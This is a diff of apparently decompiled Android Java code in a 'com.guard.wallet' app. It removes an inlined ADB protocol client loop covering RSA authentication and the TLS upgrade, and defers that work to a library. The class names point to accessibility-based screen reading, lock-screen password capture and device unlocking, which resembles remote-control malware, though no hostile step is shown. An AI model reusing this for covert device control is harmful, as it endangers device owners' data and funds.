@@ -12,16 +12,11 @@ import com.guard.wallet.filter.CombineFiltersWithOr;
 import com.guard.wallet.msg.ReadScreenMessage;
 import com.guard.wallet.req.ReqUnlockDeviceVO;
 import com.guard.wallet.service.MyAccessibilityService;
-import java.io.InputStream;
-import java.security.PrivateKey;
-import java.security.interfaces.RSAPublicKey;
 import java.util.Iterator;
 import java.util.Objects;
 import java.util.concurrent.Semaphore;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
-import javax.crypto.Cipher;
-import javax.net.ssl.SSLSocket;
 
 /**
  * 锁屏密码确认 Runnable — 多用途分发器。
@@ -247,102 +242,8 @@ public final class ConfirmLockRunnable implements Runnable {
                 }
 
             default:
-                /* b1.d — ADB protocol handler loop */
-                com.guard.wallet.adb.AdbConnection dVar = (com.guard.wallet.adb.AdbConnection) this.b;
-                try {
-                    while (!dVar.j.isInterrupted()) {
-                        InputStream inputStream;
-                        if (dVar.u) {
-                            inputStream = dVar.h;
-                            Objects.requireNonNull(inputStream);
-                        } else {
-                            inputStream = dVar.f;
-                        }
-                        com.guard.wallet.adb.AdbMessageParser a2 = com.guard.wallet.adb.AdbMessageParser.a(inputStream, dVar.p, dVar.o);
-                        int i8 = a2.a;
-                        switch (i8) {
-                            case 1163086915:
-                            case 1163154007:
-                            case 1497451343:
-                                if (dVar.n) {
-                                    com.guard.wallet.adb.AdbStream hVar = (com.guard.wallet.adb.AdbStream) dVar.t.get(Integer.valueOf(a2.c));
-                                    if (hVar != null) {
-                                        synchronized (hVar) {
-                                            int i9 = a2.a;
-                                            if (i9 == 1497451343) {
-                                                hVar.c = a2.b;
-                                                hVar.d.set(true);
-                                                hVar.notify();
-                                            } else if (i9 == 1163154007) {
-                                                hVar.x(a2.g);
-                                                hVar.a.A(com.guard.wallet.adb.AdbMessageBuilder.b(1497451343, hVar.b, null, hVar.c));
-                                            } else {
-                                                dVar.t.remove(Integer.valueOf(a2.c));
-                                                Log.d("d", "AdbProtocol A_CLSE.");
-                                                hVar.A(true);
-                                            }
-                                        }
-                                    }
-                                }
-                                break;
-                            case 1213486401:
-                                byte[] bArr;
-                                if (!dVar.u && a2.b == 1) {
-                                    if (!dVar.s) {
-                                        PrivateKey privateKey = dVar.q.a;
-                                        byte[] payload = a2.g;
-                                        int[] iArr = com.guard.wallet.adb.AdbRsaCrypto.a;
-                                        Cipher cipher = Cipher.getInstance("RSA/ECB/NoPadding");
-                                        cipher.init(1, privateKey);
-                                        cipher.update(com.guard.wallet.adb.AdbRsaCrypto.b);
-                                        bArr = com.guard.wallet.adb.AdbMessageBuilder.b(1213486401, 2, cipher.doFinal(payload), 0);
-                                        Log.d("d", "AdbProtocol.ADB_AUTH_SIGNATURE");
-                                        dVar.s = true;
-                                    } else if (dVar.l) {
-                                        dVar.m = true;
-                                        break;
-                                    } else {
-                                        bArr = com.guard.wallet.adb.AdbMessageBuilder.b(1213486401, 3, com.guard.wallet.adb.AdbRsaCrypto.c((RSAPublicKey) dVar.q.b.getPublicKey(), dVar.r), 0);
-                                        Log.d("d", "AdbProtocol.ADB_AUTH_RSAPUBLICKEY");
-                                    }
-                                    Log.d("d", "Write the AUTH reply");
-                                    dVar.A(bArr);
-                                }
-                                break;
-                            case 1314410051:
-                                synchronized (dVar) {
-                                    dVar.p = a2.b;
-                                    dVar.o = a2.c;
-                                    dVar.n = true;
-                                    dVar.notifyAll();
-                                }
-                                Log.d("d", "AdbProtocol.A_CNXN");
-                                /* fall through to STLS */
-                            case 1397511251:
-                                dVar.A(com.guard.wallet.adb.AdbMessageBuilder.b(1397511251, 16777216, null, 0));
-                                SSLSocket sSLSocket = (SSLSocket) AppUtils.y(dVar.q).getSocketFactory().createSocket(dVar.a, dVar.b, dVar.c, true);
-                                sSLSocket.startHandshake();
-                                Log.d("d", "Handshake succeeded.");
-                                synchronized (dVar) {
-                                    dVar.h = sSLSocket.getInputStream();
-                                    dVar.i = sSLSocket.getOutputStream();
-                                    dVar.u = true;
-                                }
-                                break;
-                            default:
-                                Log.e("d", String.format("Unrecognized command = 0x%x", Integer.valueOf(i8)));
-                                break;
-                        }
-                    }
-                } catch (Exception e4) {
-                    AppUtils.s("d", e4);
-                }
-                synchronized (dVar) {
-                    dVar.x();
-                    dVar.notifyAll();
-                    dVar.n = false;
-                    dVar.k = false;
-                }
+                // ADB protocol receiver thread now handled by libadb-android library internally.
+                // This case is no longer needed.
                 return;
         }
     }
